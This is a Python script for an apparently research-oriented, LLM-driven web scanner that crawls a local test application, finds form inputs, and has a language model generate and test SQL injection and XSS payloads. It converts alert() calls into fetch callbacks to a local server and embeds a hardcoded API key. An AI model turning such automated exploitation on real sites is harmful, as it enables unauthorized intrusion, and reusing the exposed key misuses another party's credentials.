import random
import re
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
import os
from selenium.webdriver.support.ui import Select
import time
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver.common.alert import Alert
from openai import OpenAI
from urllib.parse import urlparse
import argparse  # ← 新增

from browser.driver import get_driver  # 得到一个初始的driver实例
from browser.login import login, check_login  # 登录函数和检查登录状态函数
from browser.navigation import get_all_links  # 递归获取所有链接
from browser.form import get_all_form_inputs  # 获取表单输入点和填充表单的函数

from utils.misc import generate_random_value  # 生成随机值的函数
from utils.sql_log import get_all_sql_statments, clear_sql_log  # 获取SQL日志和清除日志的函数
from vuln.sql import find_sql_inputs, get_all_sql_inputs  # SQL注入检测函数



# 添加命令行参数解析
parser = argparse.ArgumentParser(description="Web automation and SQL log parser")
parser.add_argument('--sql_log_name', required=True, help='Path to the MySQL log file')
args = parser.parse_args()

def extract_xss_input_context(input_value, page_content, payload, occurrence=1):
    """
    提取输入值所在位置的上下文信息
    :param input_value: 用户输入的测试值
    :param page_content: 页面内容（HTML）
    :param payload: 实际使用的payload（用于调整上下文范围）
    :param occurrence: 指定获取第几个匹配项（默认为第一个）
    :return: 包含输入值及其周围HTML上下文的字符串列表
    """
    contexts = []
    start_index = -1
    count = 0
    
    # 查找指定次数的出现位置
    while count < occurrence:
        start_index = page_content.find(input_value, start_index + 1)
        if start_index == -1:
            break
        
        count += 1
        
        end_index = start_index + len(input_value)
        
        # 计算上下文范围（前后各扩展100字符）
        length_diff = len(payload) - len(input_value)
        chazhi = int(length_diff / 2)  # 使用整数除法
        # 确保提取的上下文不会超出HTML内容的边界
        context_start = max(0, start_index - 10 - chazhi)  # 取输入值前200个字符作为上下文开始
        context_end = min(len(page_content), end_index + 10 + chazhi)  # 取输入值后200个字符作为上下文结束
        
        # 向前查找最近的完整标签开始
        while context_start > 0:
            if page_content[context_start] == '<':
                break
            context_start -= 1
        
        # 向后查找最近的完整标签结束
        while context_end < len(page_content) - 1:
            if page_content[context_end] == '>':
                context_end += 1
                break
            context_end += 1
        
        # 提取上下文片段
        context_snippet = page_content[context_start:context_end]
        
        # # 高亮显示输入值
        # highlighted = context_snippet.replace(input_value, f"<mark>{input_value}</mark>")
        
        # 添加到结果列表
        contexts.append(context_snippet)
    
    return contexts if contexts else [""]


def check_xss_reflection(target_value, urls, payload=None):
    """
    检查 target_value 是否出现在当前页面或给定的 url 页面中（反射）
    :return: 出现的页面列表
    """
    reflected_pages = []
    contexts = []
    if payload==None:
        # 检查当前页
        if target_value in driver.page_source:
            # 获取输入值所在的上下文
            reflected_pages.append("self")
            context = extract_xss_input_context(target_value, driver.page_source, target_value)
            contexts.append(context)

        # 检查其它已知页面
        for u in urls:
            try:
                driver.get(u)
                check_login(driver)
                driver.get(u)

                if target_value in driver.page_source:
                    reflected_pages.append(u)
                    context = extract_xss_input_context(target_value, driver.page_source, target_value)
                    contexts.append(context)
            except:
                continue

    return reflected_pages, contexts

            
# 添加XSS检测功能
def find_xss_inputs(form_inputs, all_urls):

    xss_inputs_results = []

    for form in form_inputs:
        url = form['url']
        inputs = form['inputs']
        print(f"\n[Scanning Form for XSS] {url}")

        for input_field in inputs:
            input_type = input_field['type']
            input_name = input_field['name']

            if not input_name:
                continue

            if input_type in ['text', 'password', 'email', 'tel', 'url', 'search', 'textarea']:
                target_value = generate_random_value(8)
                # try:
                driver.get(url)
                check_login(driver)
                driver.get(url)

                # 填充字段
                for f in inputs:
                    name = f.get('name')
                    ftype = f.get('type')

                    if not name or ftype in ['submit', 'hidden']:
                        continue

                    try:
                        elem = driver.find_element(By.NAME, name)
                        elem.clear()
                        if name == input_name:
                            elem.send_keys(target_value)
                            print(f"{name} fill {target_value}")
                        else:
                            elem.send_keys(generate_random_value(5))
                            print(f"{name} fill random")
                    except:
                        print(f"[Warning] Could not find input field: {name}")
                        continue

                # 提交表单
                submitted = False
                for f in inputs:
                    if f['type'] == 'submit':
                        try:
                            if f.get('name'):
                                submit_button = driver.find_element(By.NAME, f['name'])
                            else:
                                submit_button = driver.find_element(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
                            submit_button.click()
                            submitted = True
                            break
                        except:
                            continue

                if not submitted:
                    print(f"[Warning] No submit button found for form at {url}, skipping...")
                    continue

                # 检查 XSS 是否反射在当前页面或其他页面
                # print("checking xss:",target_value) # 这里有时候也会漏找，试试print拖一下时间看还会漏吗
                time.sleep(0.2)
                matched_pages, contexts = check_xss_reflection(target_value, all_urls)
                if matched_pages:
                    print(f"[+] XSS reflected by input '{input_name}' with value '{target_value}' -> found in {matched_pages}")
                    xss_inputs_results.append({
                        "input_name": input_name,
                        "trigger_value": target_value,
                        "reflected_pages": matched_pages,
                        "context": contexts,  # 添加提取的上下文
                        "form": form
                    })
                # # 页面跳转非常多的时候容易出错，正常现象
                # except Exception as e:
                #     print(f"[Error] Exception while testing input '{input_name}': {e}")

    return xss_inputs_results

def parse_llm_output(output_text):
    """
    解析LLM的输出，提取Final Answer部分后的payload列表
    修改逻辑：
    1. 将输出转为小写进行模式匹配
    2. 找到最后一个包含"final answer"的行
    3. 返回该行之后所有非空行的原始内容
    """
    lines = output_text.split('\n')
    payloads = []
    last_final_index = -1  # 记录最后一个"final answer"行的索引
    
    # 第一步：找到最后一个包含"final answer"的行
    for i, line in enumerate(lines):
        if "final answer" in line.lower():
            last_final_index = i
    
    # 如果没有找到，返回空列表
    if last_final_index == -1:
        return []
    
    # 第二步：收集该行之后的所有非空行（保留原始格式）
    for line in lines[last_final_index+1:]:
        stripped = line.strip()
        # 跳过空行
        if not stripped:
            continue
        
        # 添加到payload列表（保留原始行内容）
        payloads.append(line)
    
    return payloads

def get_ai_response(prompt, history=None, model="deepseek-chat", max_tokens=1000):
    """
    调用LLM获取响应
    """
    if history is None:
        history = []
    
    messages = [{"role": "user", "content": prompt}]
    print(messages)
    try:
        response = client.chat.completions.create(
            model=model,
            messages=messages,
            max_tokens=max_tokens
        )
        return response.choices[0].message.content.strip()
    except Exception as e:
        print(f"Error calling AI model: {e}")
        return ""

def test_sql_payload(url, form, input_name, payload, trigger_value):
    """
    测试payload并获取SQL日志
    """
    try:
        clear_sql_log(args)
        driver.get(url)
        check_login(driver)
        driver.get(url)
        
        # 填充表单
        for input_field in form['inputs']:
            name = input_field.get('name')
            ftype = input_field.get('type')
            
            if not name or ftype in ['submit', 'hidden']:
                continue
                
            try:
                elem = driver.find_element(By.NAME, name)
                elem.clear()
                if name == input_name:
                    elem.send_keys(payload)
                    print(f"{name} fill {payload}")
                else:
                    elem.send_keys(generate_random_value(5))
                    print(f"{name} fill random")
            except:
                continue

        # 提交表单
        submitted = False
        for input_field in form['inputs']:
            if input_field['type'] == 'submit':
                try:
                    if input_field.get('name'):
                        submit_button = driver.find_element(By.NAME, input_field['name'])
                    else:
                        submit_button = driver.find_element(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
                    submit_button.click()
                    submitted = True
                    break
                except:
                    continue
 
        if not submitted:
            print(f"[Warning] No submit button found for form at {url}, skipping...")
            return []
        
        return get_all_sql_statments(trigger_value, args)
    except Exception as e:
        print(f"Error testing payload: {e}")
        return []


def needs_context_escape(user_input, sql_query):
    """
    通过分析SQL语句结构，判断用户输入是否需要上下文逃逸
    
    Args:
        user_input: 用户输入
        sql_query: SQL查询语句
        
    Returns:
        bool: 如果用户输入需要逃逸上下文返回True，否则返回False
    """
    # 检查输入是否为空
    if not user_input or not sql_query or user_input not in sql_query:
        return False
    
    # 将SQL语句按空格分割成片段
    sql_parts = sql_query.split()
    
    # 找到包含用户输入的片段
    containing_parts = []
    for part in sql_parts:
        if user_input in part:
            containing_parts.append(part)
    
    # 如果没有找到包含用户输入的片段，返回False
    if not containing_parts:
        return False
    
    # 分析每个包含用户输入的片段
    for part in containing_parts:
        # 1. 检查是否被引号包围（需要逃逸）
        if ("'" + user_input in part) or (user_input + "'" in part) or ("'" in part and part.count("'") >= 2):
            return True
        if ('"' + user_input in part) or (user_input + '"' in part) or ('"' in part and part.count('"') >= 2):
            return True
        if ('`' + user_input in part) or (user_input + '`' in part) or ('`' in part and part.count('`') >= 2):
            return True
        
        # 2. 检查是否在括号内（可能需要逃逸）
        if ('(' + user_input in part) or (user_input + ')' in part) or ('(' in part and ')' in part):
            # 检查是否是纯数值在括号内，这种情况可能不需要逃逸
            if part.replace('(', '').replace(')', '').replace(user_input, '').strip() == '':
                # 是否在WHERE子句中直接比较，例如WHERE id=(123)
                where_index = sql_query.upper().find('WHERE')
                if where_index != -1 and sql_query.find(part) > where_index:
                    preceding_parts = sql_query[:sql_query.find(part)].split()
                    if len(preceding_parts) >= 2 and preceding_parts[-1] in ['=', '<', '>', '<=', '>=', '<>', '!=', 'IN', 'LIKE']:
                        # 这种情况下即使是括号内的数值也可能不需要逃逸
                        continue
            return True
        
        # 3. 检查是否在LIKE模式中（需要逃逸）
        like_index = sql_query.upper().find('LIKE')
        if like_index != -1 and sql_query.find(part) > like_index:
            if '%' in part or '_' in part:  # LIKE模式通常包含通配符
                return True
        
        # 4. 检查是否是在字符串连接或函数调用中（需要逃逸）
        if '+' in part or '||' in part or '(' in part and ')' not in part or ')' in part and '(' not in part:
            return True
        
        # 5. 检查是否在引号内的子查询或复杂表达式中
        if part.count(user_input) > 0 and (
            part.count('(') != part.count(')') or
            part.count("'") % 2 != 0 or
            part.count('"') % 2 != 0 or
            part.count('`') % 2 != 0
        ):
            return True
    
    # 如果用户输入在SQL语句的情况不满足上述任何需要逃逸的条件，则不需要逃逸
    return False

def has_extra_behavior(sql: str, user_input: str) -> bool:
        # # 分割 SQL 语句为单词列表
        # words = sql.split()
        
        # # 查找包含用户输入的单词
        # input_block = None
        # for word in words:
        #     if user_input in word:
        #         input_block = word
        #         break
        
        # # 未找到输入块直接返回 False
        # if input_block is None:
        #     return False
        
        # 定位输入内容在区块中的位置
        input_start = sql.find(user_input)
        if input_start == -1:
            return False
        
        # 提取输入点后的后缀
        suffix_start = input_start + len(user_input)
        suffix = sql[suffix_start:]
        
        # 情况1: 后缀为空 (无额外内容)
        if not suffix:
            return False
        
        # 情况2: 后缀全部是上下文符号
        context_chars = {"'", '"', ")", ",", ";", "`", " "}
        if all(char in context_chars for char in suffix):
            return False
        
        # 情况3: 后缀包含非上下文字符
        return True

# todo：history中可以包含payload对应的sql语句（如果没有的话就写sql语句被过滤之类的意思）；上下文逃逸后，传入payload和其对应的sql语句给判断是否有额外行为的函数，如果有的话，直接不用行为改变了，直接算成功了;上下文逃逸也是，先判断下是否需要逃逸，不需要的话直接赋值就行
def run_llm_sql_attack(input_point):
    """
    对单个输入点运行LLM攻击（带历史记录版本）
    """
    url = input_point['form']['url']
    input_name = input_point['input_name']
    form = input_point['form']
    trigger_value = input_point['trigger_value']
    sql_statements = input_point['sql_statements']
    
    if not sql_statements:
        return None
    
    base_sql = sql_statements[0]
    
    # 存储攻击结果
    attack_result = {
        'input_point': input_point,
        'context_escape': {
            'success': False,
            'payload': None,
            'tested_payloads': []
        },
        'behavior_change': {
            'success': False,
            'payload': None,
            'tested_payloads': []
        }
    }
    
    # ===== 第一阶段: 上下文逃逸 =====
    print(f"\n[Context Escape] Input: {input_name} on {url}")
    
    if not needs_context_escape(trigger_value, base_sql):
        print("  [SKIP] Context escape not needed for this input")
        attack_result['context_escape']['success'] = True
        attack_result['context_escape']['payload'] = trigger_value
        attack_result['context_escape']['sql_statement'] = base_sql
    else:
        # 上下文逃逸尝试参数
        ce_attempts = 0
        max_ce_attempts = 3
        ce_history = []  # 存储失败历史
        
        while ce_attempts < max_ce_attempts and not attack_result['context_escape']['success']:
            ce_attempts += 1
            print(f"  Attempt {ce_attempts}/{max_ce_attempts}")
            
            # 选择提示模板
            if not ce_history:  # 第一次尝试使用普通模板
                prompt_template = context_escape
                prompt = prompt_template.format(
                    user_input=trigger_value,
                    sql_query=base_sql
                )
            else:  # 后续尝试使用带历史记录的模板
                prompt_template = context_escape_withhistory
                history_str = "\n".join(ce_history)
                prompt = prompt_template.format(
                    user_input=trigger_value,
                    sql_query=base_sql,
                    history=history_str
                )
            
            # 获取LLM响应
            output = get_ai_response(prompt)
            escape_payloads = parse_llm_output(output)
            
            if not escape_payloads:
                print("  No payloads generated by LLM")
                continue
            
            print(f"  Generated {len(escape_payloads)} payloads")
            
            # 测试每个逃逸payload
            for payload in escape_payloads:
                # 可以避免一些不必要的输入进去
                if trigger_value not in payload:
                    continue
                # 测试payload
                matched_sqls = test_sql_payload(url, form, input_name, payload, trigger_value)
                # 检查payload是否完整出现在SQL中
                payload_appeared = any(payload in sql for sql in matched_sqls)
                
                # 记录结果
                result = {
                    'payload': payload,
                    'matched_sqls': matched_sqls,
                    'success': payload_appeared
                }
                attack_result['context_escape']['tested_payloads'].append(result)
                
                if payload_appeared:
                    print(f"  [SUCCESS] Payload '{payload}' found in SQL logs {matched_sqls}!")
                    attack_result['context_escape']['success'] = True
                    attack_result['context_escape']['payload'] = payload
                    attack_result['context_escape']['sql_statement'] = matched_sqls[0]
                    break
                else:
                    print(f"  [FAIL] Payload '{payload}' not found in SQL logs {matched_sqls}")
                    # 记录失败历史
                    if matched_sqls:
                        # 如果有匹配的SQL语句，记录payload和SQL
                        history_entry = f"Payload: {payload} | SQL: {matched_sqls[0]}"  # 取第一条SQL作为示例
                    else:
                        # 如果没有匹配的SQL，说明SQL被过滤或未记录
                        history_entry = f"Payload: {payload} | SQL: filtered or not logged"
                    ce_history.append(history_entry)

        
    # 如果上下文逃逸失败，直接返回
    if not attack_result['context_escape']['success']:
        return attack_result


    # ===== 第二阶段: 行为改变 =====
    print(f"\n[Behavior Change] Using escaped payload: {attack_result['context_escape']['payload']}")
    escaped_payload = attack_result['context_escape']['payload']
    escaped_sql = attack_result['context_escape']['sql_statement']
    # +++ 新增检查：判断逃逸后的payload是否已有额外行为 +++
    if has_extra_behavior(escaped_sql, escaped_payload):
        print("  [SKIP] Behavior change already achieved by context escape payload")
        attack_result['behavior_change']['success'] = True
        attack_result['behavior_change']['payload'] = escaped_payload
        return attack_result
    else:
        # 行为改变尝试参数
        bc_attempts = 0
        max_bc_attempts = 3
        bc_history = []  # 存储失败历史
        
        while bc_attempts < max_bc_attempts and not attack_result['behavior_change']['success']:
            bc_attempts += 1
            print(f"  Attempt {bc_attempts}/{max_bc_attempts}")
            
            # 选择提示模板
            if not bc_history:  # 第一次尝试使用普通模板
                prompt_template = behavior_change
                prompt = prompt_template.format(
                    user_input=attack_result['context_escape']['payload'],
                    sql_query=attack_result['context_escape']['sql_statement']
                )
            else:  # 后续尝试使用带历史记录的模板
                prompt_template = behavior_change_withhistory
                history_str = "\n".join(bc_history)
                prompt = prompt_template.format(
                    user_input=attack_result['context_escape']['payload'],
                    sql_query=attack_result['context_escape']['sql_statement'],
                    history=history_str
                )
            
            # 获取LLM响应
            output = get_ai_response(prompt)
            behavior_payloads = parse_llm_output(output)
            
            if not behavior_payloads:
                print("  No payloads generated by LLM")
                continue
            
            print(f"  Generated {len(behavior_payloads)} payloads")
            
            # 测试每个行为改变payload
            for payload in behavior_payloads:
                # 可以避免一些不必要的输入进去
                if trigger_value not in payload:
                    continue
                # 测试payload
                matched_sqls = test_sql_payload(url, form, input_name, payload, trigger_value)
                
                # 检查payload是否完整出现在SQL中
                payload_appeared = any(payload in sql for sql in matched_sqls)
                
                # 记录结果
                result = {
                    'payload': payload,
                    'matched_sqls': matched_sqls,
                    'success': payload_appeared
                }
                attack_result['behavior_change']['tested_payloads'].append(result)
                
                if payload_appeared:
                    print(f"  [SUCCESS] Payload '{payload}' found in SQL logs {matched_sqls}!")
                    attack_result['behavior_change']['success'] = True
                    attack_result['behavior_change']['payload'] = payload
                    break
                else:
                    print(f"  [FAIL] Payload '{payload}' not found in SQL logs {matched_sqls}")
                    # 记录失败历史
                    if matched_sqls:
                        # 如果有匹配的SQL语句，记录payload和SQL
                        history_entry = f"Payload: {payload} | SQL: {matched_sqls[0]}"  # 取第一条SQL作为示例
                    else:
                        # 如果没有匹配的SQL，说明SQL被过滤或未记录
                        history_entry = f"Payload: {payload} | SQL: filtered or not logged"
                    bc_history.append(history_entry)
    
    return attack_result

# 提交的这个逻辑多次用到，可以考虑独立出来
def test_xss_payload(url, form, input_name, payload, trigger_value, reflected_urls):
    """
    测试XSS payload并验证执行结果
    :return: (executed, reflected_pages, contexts)
        executed: payload是否实际执行
        reflected_pages: 反射页面列表
        contexts: 反射上下文列表
    """
    try:
        
        # 导航到目标页面
        driver.get(url)
        check_login(driver)
        driver.get(url)
        
        # 填充表单
        for input_field in form['inputs']:
            name = input_field.get('name')
            ftype = input_field.get('type')
            
            if not name or ftype in ['submit', 'hidden']:
                continue
                
            try:
                elem = driver.find_element(By.NAME, name)
                elem.clear()
                if name == input_name:
                    # 添加验证标记到payload
                    verification_id = generate_random_value(6)
                    # full_payload = payload + f"<script>window.__XSS_VERIFIED = '{verification_id}';</script>"
                    elem.send_keys(payload)
                    print(f"  {name} fill payload + verification: {payload}")
                else:
                    elem.send_keys(generate_random_value(5))
                    print(f"  {name} fill random")
            except Exception as e:
                print(f"  Error filling {name}: {str(e)}")
                continue

        # 提交表单
        submitted = False
        for input_field in form['inputs']:
            if input_field['type'] == 'submit':
                try:
                    if input_field.get('name'):
                        submit_button = driver.find_element(By.NAME, input_field['name'])
                    else:
                        submit_button = driver.find_element(
                            By.XPATH, 
                            "//input[@type='submit'] | //button[@type='submit']"
                        )
                    submit_button.click()
                    submitted = True
                    
                    # 等待页面加载/脚本执行
                    time.sleep(1)
                    break
                except Exception as e:
                    print(f"  Submit error: {str(e)}")
                    continue
 
        if not submitted:
            print(f"  [Warning] Submit failed for form at {url}")
            return False, [], []
        
        # 检查反射情况
        reflected_pages, contexts = check_xss_reflection(trigger_value, reflected_urls)

        executed = False
        with open("xss_verified.txt", 'r') as f:
            for line in f:
                if trigger_value in line:
                    executed = True
                    break
        
        return executed, contexts
        
    except Exception as e:
        print(f"  XSS test error: {str(e)}")
        return False, [], []
    
def convert_to_fetch(payload, trigger_value):
    """
    Convert alert-based XSS payloads to fetch-based payloads
    Args:
        payload: Original payload string (e.g., '</pre><script>alert(123456)</script><pre>')
        trigger_value: The value to send to the server
    Returns:
        Modified payload with fetch call
    """
    # URL-encode the trigger value for safe HTTP transmission
    fetch_url = f'http://127.0.0.1:5000/xss?value={trigger_value}'
    
    # Pattern to match alert() calls with any content between parentheses
    alert_pattern = re.compile(
        r'alert\s*\(([^)]*)\)',  # Matches alert(...) with any content inside
        re.IGNORECASE
    )
    
    # Replacement with fetch call
    modified_payload = alert_pattern.sub(
        f'fetch("{fetch_url}")',
        payload
    )
    
    return modified_payload

def run_llm_xss_attack(input_point):
    """
    对单个XSS输入点运行LLM攻击
    """
    url = input_point['form']['url']
    input_name = input_point['input_name']
    form = input_point['form']
    trigger_value = input_point['trigger_value']
    context = input_point['context']

    # 处理反射页面中的 'self' 值
    reflected_urls = []
    for page in input_point['reflected_pages']:
        if page == 'self':
            reflected_urls.append(url)  # 将 'self' 替换为当前表单的 URL
        else:
            reflected_urls.append(page)

    # 存储攻击结果
    attack_result = {
        'input_point': input_point,
        'context_escape': {
            'success': False,
            'payload': None,
            'tested_payloads': [],
            'contexts': []  # 添加上下文存储
        },
        'behavior_change': {
            'success': False,
            'payload': None,
            'tested_payloads': [],
            'contexts': []  # 添加上下文存储
        }
    }
    
    # ===== 第一阶段: 上下文逃逸 =====
    print(f"\n[Context Escape] Input: {input_name} on {url}")

    if "xss_r" not in url:
        return attack_result

    ce_attempts = 0
    max_ce_attempts = 3
    ce_history = []  # 存储失败的payload和上下文

    while ce_attempts < max_ce_attempts and not attack_result['context_escape']['success']:
        ce_attempts += 1
        print(f"  Attempt {ce_attempts}/{max_ce_attempts}")
        
        # 使用上下文生成prompt
        if not ce_history:
            prompt_template = context_escape_xss
            prompt = prompt_template.format(
                user_input=trigger_value,
                context=context
            )
        else:
            # 只使用最后3条失败记录
            recent_failures = ce_history
            history_str = "\n".join([f"Payload: {p}\nContext: {c}" for p, c in recent_failures])
            
            prompt_template = context_escape_withhistory_xss
            prompt = prompt_template.format(
                user_input=trigger_value,
                context=context,
                history=history_str
            )
        
        # 获取LLM响应
        output = get_ai_response(prompt)
        print(output)
        escape_payloads = parse_llm_output(output)
        
        if not escape_payloads:
            print("  No payloads generated by LLM")
            continue
        
        print(f"  Generated {len(escape_payloads)} payloads")
        
        # 测试每个逃逸payload
        for payload in escape_payloads:
            if trigger_value not in payload:
                continue
            
            # 把payload里的alert(内容)改成fetch("http://127.0.0.1:5000/xss?value=trigger value");
            payload = convert_to_fetch(payload,trigger_value)

            # 检查反射并获取上下文
            exexted, contexts = test_xss_payload(url, form, input_name, payload, trigger_value, reflected_urls)
            
            if exexted:
                # 找出包含payload字符最多的上下文
                best_ctx = ""
                max_match_count = 0
                
                for page_contexts in contexts:
                    for ctx in page_contexts:
                        # 计算该上下文包含多少payload中的字符
                        match_count = sum(1 for char in payload if char in ctx)
                        if match_count > max_match_count:
                            max_match_count = match_count
                            best_ctx = ctx
                
                print(f"  [SUCCESS] Payload '{payload}' triggered reflection")
                print(f"         Full context: {best_ctx}")
                attack_result['context_escape']['success'] = True
                attack_result['context_escape']['payload'] = payload
                attack_result['context_escape']['matched_context'] = best_ctx  # 保存实际匹配的上下文
                break
            else:
                # 找出包含payload字符最多的上下文
                best_ctx = ""
                max_match_count = 0
                
                for page_contexts in contexts:
                    for ctx in page_contexts:
                        # 计算该上下文包含多少payload中的字符
                        match_count = sum(1 for char in payload if char in ctx)
                        if match_count > max_match_count:
                            max_match_count = match_count
                            best_ctx = ctx
                
                print(f"  [FAIL] Payload '{payload}' not found in reflection. Best context: '{best_ctx}'")
                
                # 存储失败的payload和最佳上下文
                ce_history.append((payload, best_ctx))
                    

    # 如果上下文逃逸失败，直接返回
    if not attack_result['context_escape']['success']:
        return attack_result

    # XSS的没写行为改变，到时候再设计一下prompt，更稳定一些

    return attack_result

#=====================================================================================================================

# 登录
driver = get_driver(headless=True)
login(driver)

# 获取初始页面的链接和表单
visited_links = get_all_links(driver, "http://127.0.0.1:2222/index.php")

# 获取每个链接的输入点
all_form_inputs = get_all_form_inputs(driver, visited_links)

# 找SQL注入漏洞可能的输入点
sql_results = get_all_sql_inputs(driver, all_form_inputs, args)

# 找XSS注入漏洞可能的输入点
print("\nStarting XSS Detection...")
xss_results = []
for inputs in all_form_inputs:
    xss_findings = find_xss_inputs(inputs, visited_links)
    xss_results.extend(xss_findings)

# # 打印结果
# print("\n\n=== Scan Results ===")
# print(f"\nSQL Injection Findings ({len(sql_results)}):")
# for result in sql_results:
#     print(result)

print(f"\nXSS Findings ({len(xss_results)}):")
for result in xss_results:
    print(result)



client = OpenAI(
    # 若没有配置环境变量，请用百炼API Key将下行替换为：api_key="sk-xxx",
    api_key='sk-1cb7a52f34da4e44a4974be96e33c591',  # 如何获取API Key：https://help.aliyun.com/zh/model-studio/developer-reference/get-api-key
    base_url="https://api.deepseek.com"
)

with open("prompt/sql/context_escape.txt", 'r', encoding='utf-8') as file:
    context_escape = file.read()
with open("prompt/sql/behavior_change.txt", 'r', encoding='utf-8') as file:
    behavior_change = file.read()
with open("prompt/sql/context_escape_withhistory.txt", 'r', encoding='utf-8') as file:
    context_escape_withhistory = file.read()
with open("prompt/sql/behavior_change_withhistory.txt", 'r', encoding='utf-8') as file:
    behavior_change_withhistory = file.read()

with open("prompt/xss/context_escape.txt", 'r', encoding='utf-8') as file:
    context_escape_xss = file.read()
with open("prompt/xss/context_escape_withhistory.txt", 'r', encoding='utf-8') as file:
    context_escape_withhistory_xss = file.read()


# 定义LLM攻击参数
MAX_ATTEMPTS_PER_INPUT = 3  # 每个输入点最多尝试次数
MAX_STEPS_PER_ATTEMPT = 5   # 每次尝试最多步数

# 初始化结果存储
llm_attack_results = []

# 主攻击逻辑
print("\nStarting LLM-based SQL Injection Exploitation...")
for sql_input in sql_results:
    print(f"\n=== Processing Input: {sql_input['input_name']} on {sql_input['form']['url']} ===")

    # 运行LLM攻击
    attack_result = run_llm_sql_attack(sql_input)
    
    if attack_result:
        llm_attack_results.append(attack_result)
        
        # 打印结果摘要
        if attack_result['behavior_change']['success']:
            print(f"[SUCCESS] Full exploit found!")
            print(f"Context Escape Payload: {attack_result['context_escape']['payload']}")
            print(f"Behavior Change Payload: {attack_result['behavior_change']['payload']}")
        elif attack_result['context_escape']['success']:
            print(f"[PARTIAL SUCCESS] Context escape succeeded but behavior change failed")
        else:
            print(f"[FAILURE] Context escape failed")
    else:
        print(f"[ERROR] Failed to run attack on input")

# 打印最终结果
print("\n\n=== LLM Attack Results ===")
for i, result in enumerate(llm_attack_results):
    input_point = result['input_point']
    print(f"\nResult {i+1}:")
    print(f"Input: {input_point['input_name']}")
    print(f"URL: {input_point['form']['url']}")
    print(f"Context Escape: {'SUCCESS' if result['context_escape']['success'] else 'FAIL'}")
    if result['context_escape']['success']:
        print(f"  Payload: {result['context_escape']['payload']}")
    print(f"Behavior Change: {'SUCCESS' if result['behavior_change']['success'] else 'FAIL'}")
    if result['behavior_change']['success']:
        print(f"  Payload: {result['behavior_change']['payload']}")



# 主攻击逻辑
print("\nStarting LLM-based XSS Exploitation...")
llm_xss_attack_results = []

for xss_input in xss_results:
    print(f"\n=== Processing Input: {xss_input['input_name']} on {xss_input['form']['url']} ===")
    
    # 运行LLM XSS攻击
    attack_result = run_llm_xss_attack(xss_input)
    
    if attack_result:
        llm_xss_attack_results.append(attack_result)
        
        # 打印结果摘要
        if attack_result['behavior_change']['success']:
            print(f"[SUCCESS] Full XSS exploit found!")
            print(f"Context Escape Payload: {attack_result['context_escape']['payload']}")
            print(f"Behavior Change Payload: {attack_result['behavior_change']['payload']}")
        elif attack_result['context_escape']['success']:
            print(f"[PARTIAL SUCCESS] Context escape succeeded but behavior change failed")
            print(f"Escaped Payload: {attack_result['context_escape']['payload']}")
        else:
            print(f"[FAILURE] Context escape failed for this input")
    else:
        print(f"[ERROR] Failed to run attack on input")

# 打印最终结果
print("\n\n=== LLM XSS Attack Results ===")
for i, result in enumerate(llm_xss_attack_results):
    input_point = result['input_point']
    print(f"\nResult {i+1}:")
    print(f"Input: {input_point['input_name']}")
    print(f"URL: {input_point['form']['url']}")
    print(f"Context Escape: {'SUCCESS' if result['context_escape']['success'] else 'FAIL'}")
    if result['context_escape']['success']:
        print(f"  Payload: {result['context_escape']['payload']}")
    print(f"Behavior Change: {'SUCCESS' if result['behavior_change']['success'] else 'FAIL'}")
    if result['behavior_change']['success']:
        print(f"  Payload: {result['behavior_change']['payload']}")
    
    # 打印测试过的payload（可选）
    if result['context_escape']['tested_payloads']:
        print(f"\n  Context Escape Tested Payloads:")
        for j, payload in enumerate(result['context_escape']['tested_payloads']):
            print(f"    {j+1}. {payload}")
    
    if result['behavior_change']['tested_payloads']:
        print(f"\n  Behavior Change Tested Payloads:")
        for j, payload in enumerate(result['behavior_change']['tested_payloads']):
            print(f"    {j+1}. {payload}")

# 汇总统计
total_inputs = len(llm_xss_attack_results)
successful_escapes = sum(1 for r in llm_xss_attack_results if r['context_escape']['success'])
successful_exploits = sum(1 for r in llm_xss_attack_results if r['behavior_change']['success'])

print("\n\n=== Summary ===")
print(f"Total Input Points Tested: {total_inputs}")
print(f"Successful Context Escapes: {successful_escapes} ({successful_escapes/total_inputs*100:.1f}%)")
print(f"Successful Full Exploits: {successful_exploits} ({successful_exploits/total_inputs*100:.1f}%)")


driver.quit()


